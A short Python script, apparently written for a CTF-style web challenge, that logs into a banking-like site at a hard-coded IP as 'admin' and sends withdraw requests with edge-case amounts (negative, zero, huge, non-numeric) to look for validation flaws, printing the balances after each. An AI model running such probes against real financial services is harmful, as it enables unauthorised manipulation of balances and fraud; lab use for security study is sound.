import urllib.request, urllib.parse, http.cookiejar, re, json

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None, raw=None):
    if raw is not None:
        body = raw.encode()
    else:
        body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


def nums(t):
    d = re.search(r"(\d+) 存款余额", t)
    c = re.search(r"(\d+) 现金金币", t)
    return (d.group(1) if d else "?"), (c.group(1) if c else "?")


op = sess()
s, b = req(op, "/login", {"username": "admin", "password": "pw123456"}, "POST")
print("login admin:", s, "OK" if "我的账户" in b else "FAIL")
t = clean(b)
print(" ", t[:300])
print("  dep/cash:", nums(t))

# 提现各种金额
for amt in ["100", "1", "99999999", "-1", "0", "abc", "1e9", "5000", "4900"]:
    op2 = sess()
    req(op2, "/login", {"username": "admin", "password": "pw123456"}, "POST")
    s2, b2 = req(op2, "/withdraw", {"amount": amt}, "POST")
    t2 = clean(b2)
    print(f"  withdraw amount={amt:12s} -> {t2[:120]}  {nums(t2)}")
